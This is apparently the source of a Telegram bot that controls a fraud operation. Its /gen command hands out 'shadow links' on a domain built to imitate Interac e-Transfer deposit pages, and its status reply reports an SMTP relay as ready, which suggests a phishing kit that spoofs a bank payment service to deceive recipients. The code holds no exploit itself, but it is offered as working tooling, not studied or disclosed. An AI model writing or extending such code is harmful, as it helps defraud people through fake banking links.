
import logging
from telegram import Update
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler
from telegram.constants import ParseMode

logger = logging.getLogger("TelegramBot")

class TelegramBot:
    def __init__(self, token: str):
        self.token = token
        self.app = None
        if token:
            self.app = ApplicationBuilder().token(token).build()
            # Register Handlers
            self.app.add_handler(CommandHandler("start", self.start_command))
            self.app.add_handler(CommandHandler("status", self.status_command))
            self.app.add_handler(CommandHandler("gen", self.gen_command))
        self.is_active = False

    async def start(self):
        if not self.app:
            logger.warning("Bot Token missing. Bot disabled.")
            return
            
        logger.info("Initializing Telegram Uplink...")
        await self.app.initialize()
        await self.app.start()
        await self.app.updater.start_polling()
        self.is_active = True
        logger.info("Telegram Uplink Established.")

    async def stop(self):
        if self.app:
            logger.info("Terminating Telegram Uplink...")
            await self.app.updater.stop()
            await self.app.stop()
            await self.app.shutdown()
            self.is_active = False

    async def send_message(self, chat_id: str, text: str):
        if self.is_active and self.app:
            try:
                await self.app.bot.send_message(chat_id=chat_id, text=text, parse_mode=ParseMode.MARKDOWN)
            except Exception as e:
                logger.error(f"Failed to send message: {e}")

    # --- Commands ---

    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text(
            "🤖 *RBOS-CORE PYTHON CONTROLLER*\n\n" # Updated branding
            "System is online. Available commands:\n"
            "/status - Check Node Health\n"
            "/gen - Generate Shadow Link",
            parse_mode=ParseMode.MARKDOWN
        )

    async def status_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text(
            "📡 *SYSTEM STATUS*\n\n"
            "Runtime: `Python 3.11 / FastAPI`\n"
            "Bot Controller: `Active`\n"
            "SMTP Relay: `Ready`\n"
            "Neural Engine: `Standby`",
            parse_mode=ParseMode.MARKDOWN
        )

    async def gen_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        import uuid
        link = f"https://interac.etransfer.gateway/dep_{str(uuid.uuid4())[:8]}"
        await update.message.reply_text(
            f"🔗 *NEW SHADOW LINK*\n\n`{link}`",
            parse_mode=ParseMode.MARKDOWN
        )